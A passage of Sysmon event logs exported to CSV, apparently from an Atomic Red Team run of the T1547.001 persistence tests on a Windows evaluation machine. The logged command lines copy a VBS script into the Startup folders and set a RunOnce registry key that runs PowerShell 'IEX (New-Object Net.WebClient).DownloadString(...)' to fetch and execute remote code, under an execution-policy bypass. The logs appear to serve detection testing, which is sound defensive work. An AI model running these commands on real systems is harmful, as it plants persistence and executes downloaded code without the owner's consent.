      ",-,2023-12-28T08:46:13.6633696Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_o1d0t0zc.r0x.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:13.656,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:13.6633696Z""/>
      <EventRecordID>9467</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:13.656</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_o1d0t0zc.r0x.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:13.656</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 08:46:13.656

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_o1d0t0zc.r0x.ps1

CreationUtcTime: 2023-12-28 08:46:13.656

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}",Microsoft Corporation,WinDev2309Eval,,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,1,9466,,10.0.22621.2215 (WinBuild.160101.0800),,"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:13.532

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-35d5-658d-7002-000000000b00},7044,4788,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-28T08:46:13.5336656Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:13.532,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:13.5336656Z""/>
      <EventRecordID>9466</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:13.532</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:13.532

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,2023-12-28 08:46:11.842,,,,11,9465,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 08:46:11.842

ProcessGuid: {fda94052-35d3-658d-6e02-000000000b00}

ProcessId: 6376

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_r0iopttv.vy2.ps1

CreationUtcTime: 2023-12-28 08:46:11.842

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d3-658d-6e02-000000000b00},7044,6376,,,,,"
      ",-,2023-12-28T08:46:11.8479847Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_r0iopttv.vy2.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:11.842,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:11.8479847Z""/>
      <EventRecordID>9465</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:11.842</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d3-658d-6e02-000000000b00}</Data>
      <Data Name=""ProcessId"">6376</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_r0iopttv.vy2.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:11.842</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 08:46:11.842

ProcessGuid: {fda94052-35d3-658d-6e02-000000000b00}

ProcessId: 6376

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_r0iopttv.vy2.ps1

CreationUtcTime: 2023-12-28 08:46:11.842

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}",Microsoft Corporation,WinDev2309Eval,,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,1,9464,,10.0.22621.2215 (WinBuild.160101.0800),,"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:11.691

ProcessGuid: {fda94052-35d3-658d-6e02-000000000b00}

ProcessId: 6376

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-35d3-658d-6e02-000000000b00},7044,6376,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-28T08:46:11.6926056Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:11.691,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:11.6926056Z""/>
      <EventRecordID>9464</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:11.691</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d3-658d-6e02-000000000b00}</Data>
      <Data Name=""ProcessId"">6376</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:11.691

ProcessGuid: {fda94052-35d3-658d-6e02-000000000b00}

ProcessId: 6376

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
